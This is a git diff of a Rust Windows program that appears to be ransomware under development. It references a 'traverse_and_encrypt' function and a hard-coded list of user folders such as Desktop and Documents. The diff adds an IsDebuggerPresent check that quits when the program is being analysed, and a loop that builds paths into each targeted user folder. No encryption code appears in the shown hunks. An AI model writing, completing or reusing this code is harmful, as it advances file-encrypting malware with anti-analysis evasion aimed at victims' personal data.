@@ -4,10 +4,10 @@ use std::time::Duration;
 use std::thread::sleep;
 use std::fs::File;
 use std::io::{BufWriter, Write};
-
+use std::ffi::CString;
 
 use windows_sys::{
-    core::*, Win32::Foundation::*, Win32::System::Threading::*, Win32::System::WindowsProgramming::*,
+    core::*, Win32::Foundation::*, Win32::System::Threading::*, Win32::System::WindowsProgramming::*,Win32::System::Diagnostics::Debug::*,Win32::UI::WindowsAndMessaging::*,
 };
 
 
@@ -31,7 +31,7 @@ pub fn traverse_and_encrypt() {
 
 
 
- static dir_names = [
+ static dir_names : [&str; 13] = [
         "Contacts",
         "Desktop",
         "Documents",
@@ -77,12 +77,40 @@ unsafe {
 
 
 fn main()-> std::io::Result<()> {
-println!("Hello, world!");
+//Detect against somone who is using a debugger on it
+
+  unsafe {
+              match IsDebuggerPresent() {
+                  0 => {
+                      println!("Debugger is not present... Continue");
+                  },
+                  _ => {
+                      println!("Debugger is present... Terminating. Code {}", IsDebuggerPresent());
+                      std::process::exit(0);
+                  }
+              }
+          }
+unsafe{
+MessageBoxA(0, s!("Hello World"), s!("Helloworld"), MB_OK);
+}
+//println!("Hello, world!");
 let dir = env::current_dir().unwrap();
 
 println!("{}",dir.display());
 let time = Duration::from_secs(3);
 let file = File::create("output.txt")?;
+
+  for dir in dir_names.iter() {
+        let mut full_path = String::from("C:\\Users\\");
+        full_path.push_str(&get_username_name());
+        full_path.push_str("\\");
+        full_path.push_str(dir.clone());
+        full_path.push_str("\\*");
+        // extract path and call traverse
+        let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
+        println!("{:?}",full_path);
+    }
+
 
     // Create a buffered writer to write to the file
 let mut writer = BufWriter::new(file);
@@ -93,7 +121,7 @@ let mut writer = BufWriter::new(file);
 
     // Flush the writer to ensure all data is written to disk
     writer.flush()?;
-    println!("{:?}", get_username_name());
+   // println!("{:?}", get_username_name());
     // sleep
     sleep(time);
 Ok(())
